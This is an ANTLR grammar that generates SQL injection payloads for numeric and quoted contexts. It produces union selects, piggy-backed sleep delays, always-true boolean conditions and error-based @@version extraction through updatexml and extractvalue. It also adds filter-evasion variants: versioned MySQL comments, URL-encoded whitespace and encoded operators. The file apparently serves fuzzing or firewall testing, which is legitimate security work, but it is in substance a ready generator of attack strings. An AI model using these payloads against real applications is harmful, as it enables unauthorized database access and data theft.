grammar Injection;
start : mode_n | mode_s | mode_d;

mode_n : mode_n1 | mode_n2 | mode_n3 | mode_n4 | mode_n5;

mode_n1: val_diz val_wsp mode_bool val_wsp;
mode_n2: val_diz par val_wsp mode_bool val_wsp val_or parOpen val_diz;
mode_n3: val_diz val_wsp mode_sqli mode_cmt;
mode_n4: val_diz par val_wsp mode_sqli mode_cmt;
mode_n5: val_diz val_tsq val_wsp mode_bool val_wsp val_or val_tsq terDigitZero;

//mode_s : val_tsq val_wsp mode_bool val_wsp val_or val_tsq | val_tsq par val_wsp mode_bool val_wsp val_or parOpen val_tsq | val_tsq val_wsp mode_sqli val_cmt | val_tsq par val_wsp mode_sqli val_cmt;

mode_s :  mode_s1 | mode_s2 | mode_s3 | mode_s4 | mode_s5 | mode_s6 | mode_s7;
mode_s1: val_tsq val_wsp mode_bool val_wsp val_or val_tsq;
mode_s2: val_tsq par val_wsp mode_bool val_wsp val_or parOpen val_tsq;
mode_s3: val_tsq val_wsp mode_sqli mode_cmt;
mode_s4: val_tsq par val_wsp mode_sqli mode_cmt;
mode_s5: terDigitZero val_tsq val_fs val_wsp mode_bool val_wsp val_or val_tsq;
mode_s6: terDigitZero val_tsq val_or val_wsp val_fe val_wsp mode_bool val_wsp val_or val_tsq;
mode_s7: terDigitZero val_tsq val_fs val_wsp mode_sqli mode_cmt;

mode_d : mode_d1 | mode_d2 | mode_d3 | mode_d4;
mode_d1: terDQuote val_wsp mode_bool val_wsp val_or terDQuote;
mode_d2: terDQuote par val_wsp mode_bool val_wsp val_or parOpen terDQuote;
mode_d3: terDQuote val_wsp mode_sqli mode_cmt;
mode_d4: terDQuote par val_wsp mode_sqli mode_cmt;

//### Injection Context ###
//mode_sqli : mode_union | mode_piggy | mode_bool ;
mode_sqli : mode_union | mode_piggy | mode_bool | mode_error ;

//### Piggy-backed Attacks ###
mode_piggy : opSem opSel val_wsp funcSleep;

//### Union Attacks ###
mode_union : mode_u1 | mode_u2 | mode_u3 | mode_u4;
mode_u1: val_uu val_wsp opSel val_wsp cols;
mode_u2: val_uu val_wsp mode_up opSel val_wsp cols;
mode_u3: val_uu val_wsp parOpen opSel val_wsp cols par;
mode_u4: val_uu val_wsp mode_up parOpen opSel val_wsp cols par;

//val_uu : val_uu1 | val_uu2 | val_uu3;
//val_uu1: opUni;
//val_uu2: t1 opUni t2;
//val_uu3: t3 t4 opUni t5 ;

//val_uu : opUni | t1 opUni t2 | t3 t4 opUni t5 ;
val_uu : 'union' | '/*!union*/' | '/*!50000union*/';

mode_up : mode_up1 | mode_up2;
mode_up1: all val_wsp;
mode_up2: distinct val_wsp;
cols : terDigitZero;
distinct : 'distinct';
all : 'all';
t1: '/*!';
t2: '*/';
t3: '/*!';
t4: '50000';
t5: '*/';

//# boolean values which evaluate to false
mode_bool : mode_or | mode_and ;
mode_or : val_or mode_bt ;
mode_and : val_and mode_unf;
//mode_and : val_and booleanFalseExpr;
//mode_and : val_and val_wsp booleanFalseExpr | val_and booleanFalseExpr;
//mode_or : val_or val_wsp mode_bt | val_or mode_bt;

// False
//booleanFalseExpr : mode_unf ;
mode_unf : mode_fa | mode_bf2 | mode_bf3;
//mode_bf1: mode_fa;
mode_bf2: val_wsp val_not val_wsp mode_ta;
mode_bf3: val_wsp val_not val_bi mode_fa;
//mode_unf : val_not val_wsp mode_ta | val_not val_bi mode_fa | mode_fa;
mode_fa : mode_fa1 | mode_fa2 | mode_fa3 | mode_fa4 | mode_fa5;
mode_fa1: val_wsp falseConst;
mode_fa2: val_wsp terDigitZero;
mode_fa3: val_tsq val_tsq;
mode_fa4: falseConst;
mode_fa5: terDigitZero;
//mode_fa : falseConst | terDigitZero;
falseConst : 'false';

//### Boolean-based Attacks ###

//mode_bt : mode_bt1 | mode_bt2;
mode_bt : mode_unt | mode_bt2;
//mode_bt1: mode_unt;
//mode_bt2: binaryTrue;
mode_bt2: mode_bt2_1 | mode_bt2_2 | mode_bt2_3 | mode_bt2_4 | mode_bt2_5 | mode_bt2_6 | mode_bt2_7 | mode_bt2_8 | mode_bt2_9 | mode_bt2_10 | mode_bt2_11 | mode_bt2_12;
//mode_unt : val_wsp mode_ta | val_wsp val_not val_wsp mode_fa | val_bi val_wsp mode_fa | val_bi val_wsp mode_ta ;
mode_unt : mode_unt1 | mode_unt2 | mode_unt3 | mode_unt4 | mode_unt5 | mode_unt6;
mode_unt1: val_wsp mode_ta;
mode_unt2: val_wsp val_not val_wsp mode_fa;
mode_unt3: val_bi val_wsp mode_fa;
mode_unt4: val_wsp val_bi val_wsp mode_fa;
mode_unt5: val_wsp val_bi val_wsp mode_ta;
mode_unt6: val_bi val_wsp mode_ta ;

//binaryTrue : mode_bt2_1 | mode_bt2_2 | mode_bt2_3 | mode_bt2_4 | mode_bt2_5 | mode_bt2_6 | mode_bt2_7 | mode_bt2_8 | mode_bt2_9 | mode_bt2_10 | mode_bt2_11 | mode_bt2_12;
mode_bt2_1: mode_unt val_eq val_wsp parOpen mode_unt par;
mode_bt2_2: mode_unf val_eq val_wsp parOpen mode_unf par;
mode_bt2_3: val_tsq terChar val_tsq val_eq val_tsq terChar val_tsq;
mode_bt2_4: terDQuote terChar terDQuote val_eq terDQuote terChar terDQuote;
//以下两行新增
mode_bt2_5: val_wsp val_tsq terChar val_tsq val_eq val_tsq terChar val_tsq;
mode_bt2_6: val_wsp terDQuote terChar terDQuote val_eq terDQuote terChar terDQuote;
mode_bt2_7: mode_unf val_lt parOpen mode_unt par;
mode_bt2_8: mode_unt val_gt parOpen mode_unf par;
mode_bt2_9: val_wsp mode_ta val_wsp opLike val_wsp mode_ta;
// trueAtom wsp opLike wsp trueAtom
// trueAtom : trueConst | terDigitOne | na wsp n11 | nx wsp parOpen opSel wsp n111 | nif wsp n11;
mode_bt2_10: mode_unt val_wsp opIs val_wsp trueConst;
mode_bt2_11: mode_unf val_wsp opIs val_wsp falseConst;
mode_bt2_12: mode_unt opMinus parOpen mode_unf par;


mode_ta : mode_ta1 | mode_ta2 | mode_ta3 | mode_ta4 | mode_ta5;
mode_ta1: trueConst;
mode_ta2: terDigitOne;
mode_ta3: na val_wsp n11;
mode_ta4: nx val_wsp parOpen opSel val_wsp n111;
mode_ta5: nif val_wsp n11;
trueConst: 'true';
na : '{a';
n11 : '1}=1';
nx : '{x';
//nselect : '(select';
n111 : '1)}=1';
nif : '{`if`';

//### Error Attacks ###
mode_error : val_and val_wsp val_ef parOpen terDigitOne val_com nconcat parOpen n0x7e val_com nversion val_com n0x7e par val_com terDigitOne par;
val_ef : 'updatexml' | 'extractvalue';
nconcat : 'concat';
n0x7e : '0x7e';
nversion : '@@version';


// Obfuscation
//val_wsp : blank | inlineval_cmt;
val_wsp : '+' | '%0b' | ' ' | '%0a' | '%0c' | '%0d' | '%a0' | '%09' | '/**/' | '%20';

// Syntax-repairing
//val_cmt : val_ht | doubleDash blank;
mode_cmt : val_ht | mode_cmt2;
//val_cmt1: val_ht;
mode_cmt2: doubleDash val_wsp;
val_ht : '#' | '%23';
doubleDash : '--';
// SQL functions
funcSleep : sleep  parOpen  val_dez  par ;
sleep: 'sleep';
val_fs : '<@=1' | '<@!=1' | '<@=1.' | '<@=.1' | '<@!=.1' | '<@!=1.';
val_fe : '1<@' | '@<@' | '!@<@' | '!@<@.' | '1<@.' | '@<@.';

//blank : ' ' ;
//inlineval_cmt : '/**/' ;
parOpen : '(';
par : ')' ;
terOne : '1';
//val_tsq : '\'';
val_tsq : '\'' | '%27';
terDQuote : '"';
terDigitZero : '0';
terDigitOne : '1';
//val_dez : terDigitOne | '2' | '3' | '4' | '5' | '6' | '7' | '8' | '9';
val_dez : '1' | '2' | '3' | '4' | '5' | '6' | '7' | '8' | '9';
//val_diz : terDigitZero | val_dez;
val_diz : '0' | '1' | '2' | '3' | '4' | '5' | '6' | '7' | '8' | '9';
terChar : 'a';

// SQL Operators and Keyword
val_not : '!' | 'not';
val_bi : '~' | '%7e';
// 加入=的ascii码
val_eq : '=' | '%3d';
val_lt : '<' | '%3C';
// 加入>的ascii码
val_gt : '>' | '%3e';
opLike : 'like';
opIs : 'is';
opMinus : '-';
val_or : 'or' | '||';
val_and : 'and' | '&&';
opSel : 'select';
opUni : 'union';
opSem : ';' ;
val_com : ',' | '%2C';
